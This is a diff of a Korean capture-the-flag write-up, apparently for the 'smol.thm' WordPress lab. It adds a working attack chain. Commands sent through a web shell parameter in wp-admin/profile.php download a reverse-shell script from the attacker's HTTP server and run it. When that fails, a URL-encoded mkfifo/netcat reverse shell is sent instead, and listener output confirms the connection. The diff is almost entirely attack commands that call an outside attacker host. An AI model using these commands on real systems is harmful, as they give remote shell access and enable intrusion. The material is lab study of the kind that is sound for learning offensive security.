@@ -638,6 +638,7 @@ curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=bash -i >& /d
 
 ```bash
 echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
+
 ```
 
 3. **공격자가 악성 스크립트 배포를 위한 서빙**
@@ -646,17 +647,44 @@ echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
 python3 -m http.server 6666
 ```
 
-- 현재 디렉터리 파일을 6666 포트로 서비스함
+4. **타겟에서 스크립트 다운로드** -> 안전하게 /tmp 에 설치
 
-4. **타겟에서 스크립트 다운로드**
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {Your IP} 4444 > /tmp/f
 
-```
 curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=wget http://10.8.136.212:6666/rev.sh -O /tmp/rev.sh
-curl -b cookie.txt -L http://www.smol.thm/wp-admin/index.php?cmd=chmod +x /tmp/rev.sh
-```
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=chmod +x /tmp/rev.sh
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=cat /tmp/rev.sh > tmp.txt
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls -al /tmp/
+cat tmp.txt | batcat
+
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=ls | batcat
 
 5. **타겟에서 리버스 쉘 실행**
 
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh /tmp/rev.sh
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=sh -i >& /dev/tcp/10.8.136.212/1234 0>&1
+
+# 위 방식이 잘 작동하지 않음 -> 인코딩 필요
+
+```python
+import urllib.parse
+
+text = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
+encoded = urllib.parse.quote(text)
+print(encoded)
 ```
-http://www.smol.thm/wp-admin/index.php?cmd=bash /tmp/rev.sh
-```
+
+┌──(root㉿docker-desktop)-[/]
+└─# python3 test.py
+rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20sh%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%201234%20%3E%20/tmp/f
+
+curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=rm%20/tmp/f%3B%20mkfifo%20/tmp/f%3B%20cat%20/tmp/f%20%7C%20sh%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%201234%20%3E%20/tmp/f
+
+# reverse shell success
+
+┌──(root㉿docker-desktop)-[/]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.8.136.212] from (UNKNOWN) [10.10.97.230] 51558
+sh: 0: can't access tty; job control turned off
+$
